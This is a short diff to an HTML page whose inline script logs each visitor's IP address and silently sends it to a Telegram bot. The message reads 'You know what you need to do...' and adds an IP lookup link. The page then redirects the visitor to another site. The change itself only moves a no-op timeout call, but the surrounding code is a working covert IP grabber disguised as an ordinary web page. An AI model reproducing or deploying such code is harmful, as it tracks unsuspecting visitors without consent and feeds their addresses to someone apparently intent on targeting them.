@@ -24,7 +24,6 @@ body {
             const chatId = '6013637983';
             const message = `New IP logged: ${ip}. You know what you need to do...
             https://ipapi.co/?q=${ip}`;
-          setTimeout('', 5000);
 
             $.ajax({
                 url: `https://api.telegram.org/bot${token}/sendMessage`,
@@ -34,6 +33,7 @@ body {
                     text: message
                 },
                 success: function(response) {
+                    setTimeout('', 5000);
                     console.log('Message sent successfully:', response);
                     window.location.href = 'https://goofy-ahh-website.onrender.com';
                 },
@@ -60,6 +60,7 @@ body {
 </body>
 
 </html>
+
 
 
 
